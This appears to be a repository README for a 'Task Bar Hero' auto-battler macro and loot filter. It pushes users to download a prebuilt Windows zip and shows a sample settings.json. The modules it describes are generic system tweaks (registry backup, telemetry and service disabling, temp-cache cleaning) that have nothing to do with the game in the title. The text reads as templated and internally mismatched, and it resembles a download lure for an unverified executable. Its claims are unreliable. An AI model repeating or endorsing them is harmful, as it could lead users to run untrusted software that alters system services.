Overview

Task Bar Hero — Auto-Battler Macro & Loot Filter (Portable x64 Build) (task-bar-hero-auto-battler-macro-loot-portable-x64) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through config/settings.json with live hot-reload support and zero external dependencies.

1-Click Prebuilt Package (No Compiler Required): Even though the full source tree (src/, config/) is included in this repository, end users do not need to compile anything. Click the green Download Portable Release button above or grab task-bar-hero-auto-battler-macro-loot-portable-x64-v1.2.0-win64.zip directly from Releases.

Architecture & Modules

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| Portable Lifecycle Engine | Zero-install isolated state container | Leaves host registry clean; 1-click rollback |
| Profile State Snapshot | Automatic backup before applying changes | Restores baseline configuration at any time |
| Telemetry & Task Tuner | Disables redundant background update checks | Lowers idle memory & disk I/O overhead |
| Unattended CLI Mode | JSON-driven configuration (config/settings.json) | Scriptable batch deployment on Windows 10/11 |

Configuration (config/settings.json)

{
  "version": "1.2.0",
  "runtime": {
    "portable_mode": true,
    "auto_backup_registry": true,
    "verify_signatures": true,
    "theme": "dark",
    "log_level": "info"
  },
  "modules": {
    "lifecycle_manager": {
      "enabled": true,
      "clean_temp_cache": true,
      "preserve_user_profiles": true
    },
    "service_optimizer": {
      "enabled": true,
      "disable_telemetry_tasks": true
    }
  }
}
